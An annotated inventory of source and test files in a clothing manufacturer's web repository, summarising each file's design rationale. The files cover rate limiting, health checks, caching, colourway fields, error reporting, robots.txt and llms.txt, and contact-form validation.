- `endpoints/eventsRateLimit.test.ts` — "The limiter on the one endpoint anyone on the internet can write to. Testable at all because the clock is a parameter. That is the point of the shape: a limiter that reads Date.now() internally can only be tested by sleeping, so in practice it does not get tested." Ordinary session (3 beacons) passes untouched; per-IP cap returns `{allowed:0, reason:'per-ip'}`; partial allowance keeps "the events that still fit rather than losing the whole batch"; one IP cannot spend another's budget; rotating-address flood still capped by `MAX_EVENTS_PER_ISOLATE` ("the backstop that makes the total bounded regardless").
- `endpoints/events.test.ts` — "The unauthenticated write endpoint, and the only one in this system." Handler-level testing because "neither [the 100%-covered limiter nor the pure sanitize] is what makes this endpoint safe. What makes it safe is the ORDER and the always-204." ⚠️ (1) RATE LIMITING AFTER SANITISING: swap them and "anyone can exhaust a real visitor's allowance by posting 20 pieces of garbage — the response is 204 either way, so the bug has no symptom until analytics quietly stop arriving." ⚠️ (2) "THE WARN LINE IS THE ONLY EVIDENCE A FLOOD EVER HAPPENED" — delete it and a flood is "literally unobservable until someone opens the database — which is the exact silence the limiter was added to break." IPs per-test because `rateLimitState` is module scope by design.
- `endpoints/publicViewerSmoke.test.ts` — Pins the smoke test's ability to catch a CACHED 404. The 2026-08-06 incident: HEAD → 200 with correct content-length, GET → 404 (a 25-hour-old cached miss from before the object existed); "The file was intact in R2 the whole time… artworkVerdict: ok, the filesize, the {OPAQUE, MASK} census and the smoke test's own HEAD were all green while a buyer scanning a QR tag would have seen nothing." Fix = bare GET gated behind `SMOKE_BROWSER_GET` (once per deploy; multi-megabyte GET vs $5/month egress is why check 3 uses HEAD). ⚠️ Answered CLAUDE.md's "what would have to break for it to fail": scenario B — with the flag OFF the identical broken server passes — "That asymmetry IS the regression — it reproduces the blind spot as a fact rather than describing it in a comment." Fake origin: HEAD always 200 "that is the incident, not a contrivance: the object really was there, and HEAD really did say so."
- `endpoints/health.test.ts` — `/api/health` feeds ci.yml post-deploy, uptime.yml outage issues, and UptimeRobot emails: "A health endpoint that answers 200 while the database is unreachable turns all three of those into decorations — the exact failure this repo already had… when the uptime workflow sat dead for ~23 hours while looking healthy (CLAUDE.md, 'Silence is not success')." ⚠️ "The 503 branch is the one that has never run in production and therefore the one worth pinning: it only executes when D1 is down, which is precisely when nobody is in a position to debug it." Path asserted hard-coded (renaming silently disarms all four monitors). `no-store` on BOTH branches — "A cached health check is worse than none… the failure branch is the easy one to forget." Probe stays cheap: `count` on one small collection, "a `find` returning documents would put row payloads on that schedule."
- `endpoints/viewerCache.test.ts` — ⚠️ "THE FAILURE THIS PREVENTS LOOKS LIKE A BROKEN IMAGE, NOT LIKE A CACHE BUG": `buildViewerResponse` resolves URLs against the request origin, so key must include origin "or a preview's URLs would serve to production, or the reverse." Colourways + default-vs-named separated; separator collision tested against hyphenated slugs ("`normalizeSlug` permits letters, digits and hyphens"). ⚠️ TTL asserted against an INJECTED CLOCK: "A test that waits for real time either takes a minute or proves nothing" — boundary exact (59,999 ms hit / 60,000 miss) plus "an expired read must not leave the entry behind"; map bounded at ceiling under pressure.
- `endpoints/projectViewer.test.ts` — Projection tests: `absolutize` (relative/absolute/null), and fixtures carrying INTERNAL fields (`note`, `sourceReference: zprj://secret-source`, colourway notes) that must never cross. ⚠️ "THIS SUITE ASSERTED THE OPPOSITE UNTIL 2026-09-05, and the behaviour it guarded was a loaded gun": customisation copy was ONE text for the whole catalogue from a `build-process` global read on every request.
- `endpoints/pipelinePlan.test.ts` — "WHY THE COVERAGE GAP HERE WAS THE DANGEROUS KIND": the endpoint is PRIVATE and was at 0%, "meaning its authorisation check had never been executed by a test. An auth regression here is silent in both directions a reviewer would look: the happy path still works, and the endpoint is not linked from anywhere." ⚠️ "AND THE OUTPUT IS PHYSICALLY IRREVERSIBLE": variant IDs baked into the merged GLB, colourway slugs printed on QR tags — drop/reorder and "the pipeline produces a file whose colour buttons silently do nothing on the live page — the exact failure that made typing the IDs by hand unacceptable." Auth tested with near-misses ('Admin', '', unknown role) and "without querying the database" (`find` not called). Fixture notes `active` absent defaults to on.

- `fields/colourways.ts` — Colours, inline on the Product, replacing a separate collection. WHY: the old shape encoded "which colour do visitors see first?" in THREE places (product relationship + row checkbox + afterChange hook keeping siblings in step) and "managing a product's colours meant navigating away from the product. Here the order of the rows *is* the answer, so the three cannot disagree and a colour can never be orphaned." Three values no longer typed by anyone: `sequence` → row position, `isDefault` → topmost switched-on row, `variantId` → picked from names inside the uploaded CLO file (all derived in projectViewer.ts). ⚠️ DELIBERATELY NO `minRows: 1` (present until 2026-08-09): it fired "at the one moment the answer cannot be known" — a new product couldn't be SAVED until a colour name and slug were typed ("the same slug this file's own help text calls 'never change it once QR codes are printed'"), but the CLO file isn't uploaded yet, so "the owner invents a colour… leaving a guessed row to delete. The whole design says the file tells you the colours; that rule said tell me first." Nothing unguarded: `assertPublishable` refuses a published product with no colours "and says so better" — same reason posterPreview/variantId aren't `required`: "the gate insists at publish time, so a half-finished draft can still be saved."
- `fields/deriveSlug.ts` (21 lines, read whole) — Name → web address word. "SUGGESTION ONLY, AND ONLY INTO A BLANK. A slug is printed on physical QR tags and cannot be recalled, so nothing automated may rewrite one — the same rule importColours.ts is built around, for the same reason." Returns '' rather than a nearly-valid string: "an empty field shows the existing message, which tells the owner what to do. A silently mangled one does not."
- `fields/suggestVariantId.ts` — Pre-select the obvious colour match for SourceVariantSelect. "When the row is called 'Wine' and the robot MEASURED a file colourway as wine, choosing it from that list is not a decision — it is typing." All three conditions required TOGETHER: blank field only ("never overrides a choice the owner already made"), trimmed case-insensitive name match, and that match is `high` confidence. ⚠️ "Condition 3 … must never be loosened to 'closest match'. A `low`-confidence guess applied automatically, with nobody in the loop, is exactly how a maroon garment was published as 'Navy' on 2026-08-03." `null` means "leave the field alone" — "an unmatched or already-answered row is the ordinary case, not a failure." `siblingPath` derives rather than hardcodes: Payload builds nested paths as parent+`.`+name, verified against installed @payloadcms/ui 3.86.0 (`createNestedClientFieldPath` joins exactly that; row path uses numeric INDEX not `id`) — "which is why this walks `path` instead of hardcoding a segment position."
- `fields/formStateRows.ts` — Rebuild array rows from Payload's admin form state. WHY, measured 2026-08-11: `useFormFields` does NOT expose the array as one entry — it flattens every row into its own path (no `colourways` key at all) — so `fields.colourways?.value` is `undefined`; ReadinessPanel read exactly that, `toGateColourways` defensively returned `[]`, "and the panel therefore told the owner 'This product has no colours yet' on a LIVE product with three colours, all of them complete." ⚠️ "Nothing could catch it short of opening the page: the value is typed `unknown`, so TypeScript is satisfied; the defensive branch is correct in isolation and unit-tested; the build passes; and the server-side gate reads the document… The panel was confidently wrong and everything around it was green — which is this repo's documented failure shape: the tests could not exhibit the failure." Deeper paths skipped "rather than flattened into the row under a dotted key, which would make a row look like it had a property it does not"; rows ordered by index.
- `fields/camera.ts` (75 lines, read whole) — `<model-viewer>` camera validation: orbit/target = three whitespace-separated tokens, each `auto` or a number with optional unit (deg/rad/%/m/cm/mm); FOV `30deg`-style. Five fields with defaults (front 0deg 82deg 105%, back 180deg…, side 90deg…, target auto auto auto, FOV 30deg) in one collapsed collapsible whose description teaches the format inline.
- `fields/colourways.test.ts` — Auto-fill hooks: slug suggested into a BLANK only — "NEVER rewrites an existing slug — it is on a printed QR tag"; altText built from product+colour name ("Velocity Tee in Wine"), left alone when written, blank when nothing to build from. ⚠️ displayName and slug stopped being `required` on 2026-08-11: "a swatch-only row from a low-confidence colour import must be SAVEABLE with both blank, for a human to fill in later" — verified against a real local Payload+D1 instance that `required: true` made the shrink robot's automated PATCH fail (`ValidationError`) "the moment any file colour matched with low confidence." ⚠️ slug's blank-rejection came from its own custom `validate` ("a custom validate replaces Payload's default required check, so the `required` flag alone was never what blocked it") — fix pinned in the function itself; bad chars/collisions must still reject once non-blank.
- `fields/deriveSlug.test.ts` (19 lines, read whole) — Lowercase/hyphenate, punctuation dropped and runs collapsed (`N001 — "Velocity" Tee!!` → `n001-velocity-tee`), leading/trailing hyphens trimmed, empty rather than invalid for `—— ——`, non-strings and numbers → ''.
- `fields/suggestVariantId.test.ts` (65 lines, read whole) — "suggestVariantId only ever saves a keystroke — it may never spend one. A confident wrong suggestion is how a maroon garment came to be published as 'Navy' on 2026-08-03, so every case below either returns the one obvious match or returns null; there is no 'closest guess' branch to test, because there is no such branch in the function." Covers: high-confidence match, never overwrites owner choice, low-confidence → null, no match → null, case/whitespace both sides, unnamed row, empty file list, `''` treated as unset. `siblingPath` swaps last segment keeping row index (row 0 and multi-digit).
- `fields/formStateRows.test.ts` — ⚠️ "The fixture below is REAL. It is the shape probed out of the running admin on 2026-08-11 for a live product with three complete colours — not a shape invented to match the implementation. That distinction is the whole point: the bug this pins existed because every fixture in the suite fed `toGateColourways` a plain array, which is exactly what the admin never supplies." Rebuilds flattened rows; orders by index not key order ("Object.keys order puts row 1 first here on purpose"); empty/undefined/odd input → []; ignores other arrays on the form; deeper nested path skipped "rather than inventing a dotted property" — then pipes the rebuilt rows through the real `toGateColourways`/`collectPublishProblems`.

- `lib/families.ts` — The five product families in one place. ⚠️ "THESE NAMES ARE THE `category` VALUES ON THE PRODUCTS COLLECTION, EXACTLY. The gallery filter matches on them by string equality, so a rename in `Products.ts` not made here does not throw, does not fail a typecheck, and does not look wrong — it silently returns an empty gallery" — `families.test.ts` asserting the lists identical "is the only thing standing between a one-word edit and a filter that quietly matches nothing." "The homepage already carried a comment claiming the two 'cannot describe different catalogues'. That was an intention, not a mechanism, until this file existed." ⚠️ SLUGS ARE PUBLIC URLS and deliberately NOT derived at runtime: "deriving them would make a copy edit silently break every existing link."
- `lib/colourwayAccess.ts` (33 lines, read whole) — "The one definition of 'this colourway can actually be served'." If the gallery and the detail endpoint each had their own copy, "the gallery would advertise garments the detail page refuses to serve, and nothing would catch it: both sides would be green, and the only symptom would be a buyer clicking a card and landing on '[ REFERENCE UNAVAILABLE ]'" — same shape as `isMediaReferenced` vs `find-orphan-media.mjs`. ⚠️ The rule is ADDRESSABILITY, not a poster: it used to be `if (!poster) continue` and "that regressed live on 2026-08-21: detaching a product's posters dropped every colourway and 404'd a PUBLISHED garment with QR tags in the field. A slug is the URL segment and the string printed on the physical tag." `active` defaults true (only explicit false retires); index signature lets callers pass whole documents.
- `lib/content.ts` — Server-only content access for public marketing pages: "a THIN I/O SHELL on purpose — every decision about what a buyer sees lives in projectPublic.ts." ⚠️ Every read wrapped because `resolveCloudflareEnv()` returns null during `next build` "so any read attempted then throws by design" — pages are force-dynamic and helpers swallow the throw "so a stray build-time probe can never fail the build." ⚠️ Falls back rather than 500s: "A page whose job is to generate leads must still show the company name, the email and the WhatsApp number when D1 is having a bad minute. Measured 2026-09-04: with PAYLOAD_SECRET absent the pages still rendered fully." 60 s in-process cache measured 2026-09-05 (`/` 9.8 ms, `/contact` 20.8 ms, `/products` **302 ms** — "fifteen times slower, because it queries D1 for every published product at depth 1 on every single request"). Honest limits stated: not shared between isolates, not invalidated on CMS save — owner chose this 2026-09-05 over an R2 bucket + tag table "That remains the upgrade path if instant invalidation is ever wanted." ⚠️ FAILURES NEVER CACHED: "caching that fallback would turn a bad second into a bad minute. Only a successful read is stored." Public non-personalised data only.
- `lib/projectPublic.ts` — Pure projections for public marketing pages, separated because vitest.config excludes "bootstrap + I/O shells with no branch of their own": "The rules below are neither bootstrap nor I/O: they decide what a buyer sees, they have real branches, and they are exactly the logic that would silently rot." `PublicSiteSettings` EXTENDS the shared `ViewerSiteSettings` rather than widening it: that type is the viewer's API contract and "the viewer has no tab icon to set… Widening it would push a field into the public viewer payload that nothing there reads." ⚠️ `EMPTY_FOOTER`: "Copy has a default; a claim does not. The split is the whole point — a blank certification list renders NO block, never an example one." `FALLBACK_SITE_SETTINGS` is "the ONLY settings the 404 renders, because that page reads no database on purpose… It lives here and not in content.ts because content.ts imports Payload, and the 404 must not."
- `lib/posterLoading.ts` (27 lines, read whole) — Audit IM-05/PF-20: "EVERY CARD WAS `loading="lazy"`, INCLUDING THE ONES ON SCREEN WHEN THE PAGE OPENS. A lazy image waits for layout… so the largest picture on the first screen — the element LCP times — started late. Lighthouse measured /products at 4,012 ms LCP on a phone profile (2026-09-11), against 2,688 ms for the home page." Only FIRST card gets `fetchpriority="high"`: "raising the priority of several images is the same as raising none… on a one-column phone the first card is the only one on screen"; cards 2–3 eager without hint (share first row from tablet up); rest lazy "— the browser still fetches the next few early on its own, because its lazy threshold reaches well below the fold."
- `lib/wordmarkFit.ts` (12 lines, read whole) — "FITTED, NOT GUESSED: two fixed sizes both ran 'RUN APPAREL' off the edge of the design artifact, because Archivo 900 at 122% is not a width you estimate. The name comes from a CMS field, so its length is an input, not a constant." Non-finite/non-positive inputs → 1; safety factor 0.995.
- `lib/themeColor.ts` (15 lines, read whole) — One colour per scheme (audit CO-05): viewer declared theme-color since 2026-08-18, marketing site declared nothing "so Safari guessed." A meta tag cannot read a CSS custom property, so these are "necessarily a COPY of `--bg` in tokens.css. `themeColor.test.ts` pins the copy to the token, the way the viewer's own test does… so changing `--bg` without changing this fails a test instead of shipping a mismatched bar."
- `lib/sentry.ts` — Server-side error reporting for the CMS Worker (L6-03). WHY: until 2026-08-31 Sentry held one project (`viewer`) — "the content system that every product page depends on… reported nothing anywhere. If the CMS broke, the first anyone knew was a customer seeing REFERENCE UNAVAILABLE." WHY NOT @sentry/nextjs: three documented failures on this exact stack (getsentry#18842 AsyncLocalStorage error in `captureRequestError` on Workers — "Reporters worked around it by deleting server-side Sentry and keeping only the browser, which is the state this file exists to end"; opennextjs-cloudflare#969 OpenTelemetry fails to bundle; #794 instrumentation hook fails under OpenNext 15.4.1) plus a repo-specific trap: `withPublicViewerVary` MUST remain the OUTERMOST next.config wrapper or `Vary: Origin` silently disappears — "Adding a wrapper to that chain to gain error reporting would risk a correctness bug in caching to fix a blindness in monitoring." So it posts the envelope itself — bare `await fetch`, "No dependency, no bundler plugin, no next.config wrapper, nothing for the OpenNext esbuild pass to trip over." ⚠️ STATED LIMITS: no tracing, performance, source maps, breadcrumbs, or anything not routed through `onRequestError`. ⚠️ `scrubHeaders` is an ALLOW-LIST ("a block-list silently starts leaking the day a new auth header is introduced") and `user-agent` is deliberately KEPT — correcting the viewer's own `delete request.headers` which "made Sentry's inbound crawler filter inert — the filter matches on a User-Agent that our own scrub had already deleted. Dropping every header is not the safe default it looks like." `parseDsn` returns null rather than throwing: "the only caller is an error handler: throwing here would replace the error being reported with an error about reporting."
- `lib/seo.ts` — Canonical origin ⚠️ NOT `viewer.wear-run.help`: that host serves the 3D reference reached from printed QR tags — "the marketing pages must not claim its canonical URLs… a wrong canonical is worse than none." Overridable so preview deploys don't advertise production URLs. ⚠️ "THE PAGES ALREADY PROMISED [a social card] AND DID NOT SUPPLY IT": `twitter: summary_large_image` with no image anywhere — measured 2026-09-05 both `og:image`/`twitter:image` absent from all three pages, "so every link shared to WhatsApp, LinkedIn or Slack rendered as a bare grey box. Promising a picture and omitting it is worse than declaring `summary`." 1200×630 "the ratio every major platform crops to"; the 1200×1500 colourway posters are a different artefact. ⚠️ `buildMetadata` exists because "OG tags that exist in one place and not another produce link previews that are right on some pages and generic on others, and nothing fails. One builder means a new page cannot forget the canonical." `locale: en_US` — ⚠️ en_GB "WAS ACTIVELY WRONG RATHER THAN MERELY VAGUE (audit FA-Q-06)": owner chose American spelling 2026-09-04 ("colorway" is the higher-volume term in the US/Canada, largest target market) — the tag "told a crawler the opposite of what the page says."
- `lib/posterHost.ts` — NOT FOUND at this path (file does not exist under apps/cms/src/lib/); removed from item-16 inventory.

- `lib/robotsTxt.ts` — Hand-built `/robots.txt`, ⚠️ "IT USED TO BE `app/robots.ts`, NEXT'S CONVENTION" but that returns a `MetadataRoute.Robots` object that can emit only User-agent/Allow/Disallow/Sitemap/Host — `Content-Signal` "is a field it has no representation for, and there is no escape hatch"; served by `app/robots.txt/route.ts` as `/llms.txt` already is. ⚠️ ONLY ONE OF THE TWO MAY EXIST: both answer `/robots.txt`, "leaving the old one in place would make which of them wins a property of Next's internals rather than a decision. It is deleted." ⚠️ `DISALLOW` is "NOT ACCESS CONTROL, AND SHARED BY EVERY GROUP" — both paths guarded by auth anyway, but without it "the login screen is a candidate for indexing and `/api/*` is crawlable JSON that costs a D1 read to serve." `CONTENT_SIGNAL = search=yes, ai-input=yes, ai-train=no` — owner decision 2026-09-07 asked with each consequence stated; ⚠️ "IT IS A STATED PREFERENCE, NOT A BLOCK, AND THE OWNER CHOSE IT KNOWING THAT" (Google/Bing ignore it; what it does is "put a reservation of rights in machine-readable form, which carries weight in the EU"); the stronger `Disallow: /` for training-only crawlers taken as its own decision. ⚠️ "CLOUDFLARE USED TO INJECT THE OPPOSITE" — managed robots.txt prepended `ai-train=no` plus nine Disallows until switched off 2026-09-04 — "reading this file in the repository told you nothing about what a crawler received." ⚠️ EVERY GROUP CARRIES THE SIGNAL AND THE DISALLOWS — the whole reason `group()` is a function: per RFC 9309 a named-agent group REPLACES the `*` group for that agent — put Content-Signal only in `*` and the AI crawlers ("the ones with a group of their own") never see it; Disallow only in `*` and "those same crawlers are invited into /admin. Both mistakes read as tidier files."
- `lib/readingLevel.ts` — Reading level for public copy (audit FA-I-11). ⚠️ WHY A NUMBER AT ALL: audit scored 8/10 "and nothing was holding it there… plain copy is one editing pass from becoming 'Our vertically integrated manufacturing capability facilitates...'" — buyers "frequently reading English as a second language"; a grade level is "the cheapest available proxy… and unlike a style opinion it can fail a build." ⚠️ "IT IS A PROXY AND THIS FILE SAYS SO": Flesch–Kincaid "cannot tell good writing from bad, it is confused by lists and by anything without a full stop, and a short sentence of jargon scores beautifully. It is used here as a CEILING on one measurable kind of density, not as a verdict." ⚠️ MEASURE PROSE, NOT LABELS: `main.innerText` on /products returns grade 17.5 ("a gallery of card names and mono chips has 145 words and 5 full stops — a 'sentence' of 29 words with no verb"), real paragraphs grade 8.4 — "that is why the selection lives in the caller and not in here." `readability` needs >1-word sentences ("an abbreviation or a decimal splits one sentence into two and the score improves for a text nobody changed") and returns null not 0 so a wrong selection gets "an absence it has to handle."
- `lib/companyFacts.ts` — "The checkable facts about the company, in ONE place. ⚠️ EVERY NUMBER HERE WAS CONFIRMED BY THE OWNER ON 2026-09-07 AND NOTHING ELSE GOES ON THE PAGE": audit found exactly two checkable numbers site-wide (FA-I-10/09/05) while "a manufacturing buyer decides whether to inquire by looking for specifics, and adjectives do not answer that." Constants not CMS fields "because this page's copy is code, and splitting half of it into the CMS would create two places for one claim to live… if these ever disagree, the footer is a claim the owner edited and this is a claim a developer shipped, so the footer wins." ⚠️ EXISTS BECAUSE THERE ARE NOW TWO READERS: `/llms.txt` began stating the same figures 2026-09-07 — "A second hand-typed copy is how a site ends up telling a person 100,000 and a language model 10,000, with nothing to catch it" (llmsTxt.test.ts asserts every value). Facts: 100,000 pieces/month, MOQ 50, 7 days to sample, 21–45 days to shipment, 200 people, 193,000 sq ft; `SHIPS_TO` "Named regions, not 'worldwide'." ⚠️ CERTIFICATE HOLDER NAMED DELIBERATELY: RUN APPAREL holds none in its own name (SEDEX/SMETA are DURUS INDUSTRIES', OEKO-TEX/GOTS/GRS the suppliers') — "A buyer's compliance team checks the holder's name first, so implying otherwise would fail at exactly the moment it mattered"; "SMETA is an AUDIT that was carried out, not a certificate" — always "SMETA-audited". ⚠️ 1889 IS A FAMILY TRADE, NOT A FOUNDING DATE — hence no `foundingDate` in structured data either: "The owner's words, 2026-09-07: the family began manufacturing and exporting in 1889… company names have changed over that time and the roots have not."
- `lib/footerHours.ts` (67 lines, read whole) — One `WORKS_TIME_ZONE = 'Asia/Karachi'` "so the clock, the light and the label agree"; `formatHours` derives "Mon–Sat 09:00–18:00 PKT" — "the footer's own wording, derived, never retyped." `isOpenAt` handles both a wrapped week (Sat→Mon) and a window past midnight (22:00–02:00) — "both real for a factory"; close exclusive; "the late half belongs to the working day it started on." `worksClock` uses `h23` "so midnight is 00:00, never 24:00."
- `lib/structuredData.ts` — JSON-LD builders. "WHY THIS MATTERS MORE HERE THAN ON A CONSUMER SITE": pages exist to be found by buyers and AI search — "an AI reader takes a company's name, location and contact details from structured data far more reliably than from prose. The audit scored findability 5/10 with this missing entirely." Pure on purpose (plain data in, plain object out). ⚠️ "SCHEMA IS A CLAIM ABOUT A REAL BUSINESS": Google treats structured data contradicting the visible page as a spam signal — "nothing is asserted here that the page does not also say." `@id` stable "so the ItemList and ContactPage can point at this node rather than repeating it. Without it, each page declares an unrelated company." ⚠️ NO `foundingDate`: 1889 is a family trade — stamping it as this legal entity's founding "would be a false statement in machine-readable form, which is the one place a wrong claim travels furthest. It is stated in prose on the home page, where it can be qualified." Logo precedence matches the tab icon (owner upload, else shipped mark). Postal address re-exported from shared so imports keep working.
- `lib/cursorMath.ts` (56 lines, read whole) — The ring's trail maths, identical to apps/viewer's Cursor.tsx target list. ⚠️ `k` IS PER 60Hz FRAME and `dt` is what makes that true: "at 120Hz it is called twice as often… and the ring arrives in half the time; on a dropped frame it falls behind and never catches up. Neither shows up in a unit test, because a unit test calls it a fixed number of times." `1-(1-k)^(dt/FRAME_MS)` samples the same exponential decay at the frame that actually happened — "the trail's SHAPE is a property of elapsed time rather than of the monitor" (FA-H-03); backgrounded tab → rate→1 lands ring on pointer; negative dt clamped. ⚠️ ONE STRING, TRANSLATE BEFORE SCALE: composing order multiplies position — "The viewer measured its ring at (1224, 612) for a pointer at (800, 400) that way." ⚠️ NO `-50%` IN HERE — centring lives as a STANDALONE `translate: -50% -50%` on `.cursor-dot/.cursor-ring` in base.css: carrying it here "applied it twice and drew the ring 17px up and left… exactly half its own 34px box (FA-R-04/FA-H-01, measured 2026-09-06)." ⚠️ "DELETING THE base.css LINE IS NOT THE EQUIVALENT FIX, AND WOULD BREAK THE LIVE VIEWER": the viewer positions its ring with Motion ("no offset of its own") so that one declaration "is the only centring the production 3D pages have. Removing it fixes this page and throws the viewer's ring 17px the other way."
- `lib/cursorBus.ts` (39 lines, read whole) — The ring's trailed position, published once per painted frame, consumed by anything "lit FROM the ring rather than from the raw pointer" — measured 2026-09-05: lit from the pointer "the footer's halo sat at x=738 while the ring was still gliding through x=348, so the glow visibly detached on every fast move." Module singleton correct "here: there is one cursor per document and every subscriber wants the same point"; new subscribers get the last point immediately; `resetCursorBus` test seam.
- `lib/llmsTxt.ts` — `/llms.txt` for the marketing site (audit FA-N-16): the viewer had one, "the site that a language model would reach FIRST had none, so the only machine-readable account of this business was written from the point of view of a single garment page." ⚠️ "A DESCRIPTION, NOT A STANDARD ANYONE HAS PROMISED TO READ": llms.txt is an unratified proposal, no vendor committed to fetching it — "this file is cheap insurance and a statement of intent, and NOTHING here may be the only place a fact appears." ⚠️ BUILT, NOT TYPED: generated from the constants the pages also render, with llmsTxt.test.ts asserting every fact/family/origin appears "so a change to the page's figures that misses this file fails rather than diverges." ⚠️ NO CONTACT ADDRESS EMBEDDED: every mailto points at a `wear-run.com` address still on the owner's checklist (FA-Q-07) — "Repeating an unconfirmed address into a file whose whole purpose is to be quoted back verbatim would multiply the error." ⚠️ SERVED WHILE `SITE_INDEXING=hidden` and not a contradiction: "noindex asks a search engine to keep pages out of RESULTS; this file says what the site is… Gating this file too would mean it first appeared at launch, untested, on the day it mattered."
- `lib/inquiry.ts` — Contact-form validation, pure. Owner decision 2026-09-07 (D3, FA-I-06): "the inquiry is written to the database before any mail is attempted, so a mail outage costs a notification and never the inquiry itself" — audit called no-form defensible and "that reasoning stands, and it is why the delivery order is part of the decision rather than an implementation detail." ⚠️ "THE HONEYPOT IS NOT A CAPTCHA AND MUST NOT BE READ AS ONE": stops the bots that fill visible fields ("most of them") at zero cost — no puzzle/script/cookie/screen-reader announcement — but "A determined script reads the CSS and skips it. The real backstop is the rate limiter… neither is protection against a targeted attack." ⚠️ WHY NOT TURNSTILE: free and effective, but a third-party script on a site whose privacy notice "gets to say it contacts nobody and stores nothing… That claim is measured (FA-O-74) and worth more than the marginal spam it would stop on a B2B inquiry form. Revisit if the spam is ever real rather than anticipated." ⚠️ Email validation DELIBERATELY PERMISSIVE: a strict regex rejects plus-tags/new TLDs/quoted locals/IDN — "the cost of a false rejection here is a buyer who cannot make an inquiry, which is the exact outcome the whole site exists to avoid… Whether the address receives mail is answered by replying to it, not by a pattern." MAX_LENGTHS (254 = RFC 5321); company optional ("a designer or a club officer may not have one").
- `lib/searchVisibility.ts` — Owner decision 2026-09-06: beta on the real address, OUT of search until called final — deploy-time `vars.SITE_INDEXING` "because the owner asked for one that cannot be flipped by a click in the admin. Flipping it is a code change, a PR and a deploy, and the value is read at request time so no rebuild is needed." ⚠️ FAILS CLOSED: only the exact word `visible` opens the site — "Unset, blank, a typo or a wrong case all mean hidden, so a Worker deployed without the var… can never advertise a half-finished site." `robotsFor` returns `undefined` when visible, deliberately NOT `{index:true}`: declaring it in layout "replaced the 404 page's own noindex after hydration (measured 2026-09-05)… A crawler indexes by default; only the hidden case needs saying." ⚠️ Sitemap covers the site's own pages "and never the garments — those live on viewer.wear-run.help… a sitemap may only speak for the host that serves it"; no lastModified "a date nobody updates is worse than none"; ⚠️ "A NEW PUBLIC PAGE MUST BE ADDED HERE OR IT IS NEVER OFFERED TO A CRAWLER, and nothing about that is visible: the page works, every test passes, and it is simply never listed" (`/privacy`+`/terms` joined 2026-09-07 a commit late); legal pages yearly/low-priority — "a privacy notice nobody can reach is not much of a notice." Hidden → empty sitemap.

- `lib/pageDescriptions.ts` — Search descriptions for the site's own pages. ⚠️ "WORDED BY THE OWNER, 2026-09-16, chosen from options. Do not rephrase without asking" (home = "the first option, but remove Sialkot"). ⚠️ 160 CHARACTERS IS THE CEILING: measured live 2026-09-16, home ran 296 and products 186 — "both were cut mid-sentence in front of every searcher (audit L-06 / FI-01)"; test holds every page to it "including each family-filtered view, which adds a prefix." Kept out of page files "because a Next page module may export only what Next expects, and a test needs to import these."
- `lib/reportCaught.ts` — Reporting for errors that are CAUGHT and recovered rather than thrown. ⚠️ "`onRequestError` NEVER SEES THESE": content.ts catches D1 failures on purpose ("a database wobble degrades the public pages to their defaults"), so the request SUCCEEDS — "a database failure became a `console.error` in a Worker log nobody reads (audit FA-P-04). That degradation is right and stays. What was missing is anyone being told." ⚠️ "THE DEGRADED STATE IS INDISTINGUISHABLE FROM THE HEALTHY ONE": fallback renders shipped defaults — "A wrong email address or a stale wordmark would sit on the live site looking entirely normal. Measured in this session's own e2e runs: the local database was missing two migrations for hours and every page test stayed green." Never throws, never awaited by a render path. `resolveDsn`: Worker binding first ("a missing DSN is a no-op, never an error — which is also why ci.yml asserts the Worker actually holds it: without that assertion a secret that failed to apply yields a silent, green, blind deploy"); `where` is "a short stable label… not a message: a label that varies per occurrence produces one issue per error rather than one issue with a count."
- `lib/inquiryRate.ts` — Contact-form rate limiting: "same mechanism and same honest limits as eventsRateLimit" (per-colo isolate memory; "nothing here should be read as protection against a DDoS — that is Cloudflare's layer"; free plan's one WAF rule spent on admin login, $5/month budget). ⚠️ "THE NUMBERS ARE DELIBERATELY GENEROUS, AND THE ASYMMETRY IS THE ARGUMENT": a false positive "silently loses a real buyer's inquiry — the single most valuable event on this site — while a false negative costs a database row. Nobody sends five genuine inquiries in ten minutes, and an office or a mobile carrier can put many genuine visitors behind one address." MAX_PER_IP 5 / 10 min, MAX_PER_ISOLATE 60, MAX_TRACKED_IPS 5000 ("a flood from many addresses grows the map rather than the database — a slower leak, but the same shape of problem"); unknown addresses counted not exempted: "a caller that strips its own headers must not thereby get an unlimited allowance."
- `lib/documentVisitsSummaryData.ts` — Last-7/last-30 summaries for the admin's Document visits list plus the newest weekly-email outcome. One find for visits "sliced in memory into 'last 7' rather than queried twice, since the 30-day set is a superset." ⚠️ kind validated against `VISIT_KINDS` itself, never a copy: "A kind added to the shared module is then recognised here the moment it exists; the hand-typed copy this replaced would have let it fall through and be counted as a person, silently and with no type error — the list and its type widen together." Nulls coerced ("Payload returns whatever was stored").
- `lib/footerCopy.ts` (11 lines, read whole) — `splitLastWord`: "…needs making properly?" split into head/last/tail "so the component can set ONE word in the serif accent without the CMS field carrying markup."
- `lib/privateDocumentLinks.ts` — Keep private catalogue/profile links out of the PUBLIC catalogue link fields (2026-09-11). WHY: those three "Catalogue link" fields "look like the obvious place to put the new link — and the public product API emits `catalogueUrl` to anyone, twice per response. A link saved there would be published, whichever address it uses." Host list must match `infra/apex-404/documents.js` — a test pins both. ⚠️ TEXT SCAN, NOT ONLY `new URL().hostname` (2026-09-15): parsing the whole value as one URL missed four shapes — `Catalogue: https://…` (scheme misread), a link buried in another URL's query string, two links separated by a space ("failed to parse as any one URL and fell through to a `text.split('/')[0]` fallback that named neither host"), and bare `catalogue.wear-run.help:443/…` ("dots and hyphens are legal scheme characters, so it has no hostname at all. All four saved.") — pattern built FROM `PRIVATE_DOCUMENT_HOSTS` with escaped dots "so the two can never say different hosts." Decodes percent-encoding once/twice ("some mail scanners (Outlook Safe Links) wrap a link"; double-encoded `%253A` resolves too), keeping undecodable text as-is; URL-token scan runs alongside for browser-normalised hostnames (2026-09-16 residual gap).
- `lib/sentry.test.ts` — Header frames the file by its own question: "WHAT WOULD HAVE TO BREAK FOR THESE TO FAIL… the repo has shipped three production bugs whose common cause was a fixture that could not exhibit the failure." Privacy tests assert ABSENCE "with a positive control alongside it so 'nothing came through' cannot pass by the scrubber simply returning an empty object"; transport test = envelope shape Sentry accepts (three newline-delimited lines, trailing newline, event id repeated, right content type); no-throw tests because "it runs inside `onRequestError`, i.e. during the handling of another exception." `at()` helper instead of `!`: noUncheckedIndexedAccess means the non-null assertion "would turn 'the array was empty' — a real regression in a stack parser — into a confusing property-of-undefined error further down." ⚠️ Malformed-DSN cases: "Every one of these produced a 'working' URL in an earlier draft that would have POSTed into nowhere. A DSN is pasted by hand exactly once, and a typo in it is indistinguishable from "no errors happened" for as long as nobody looks."
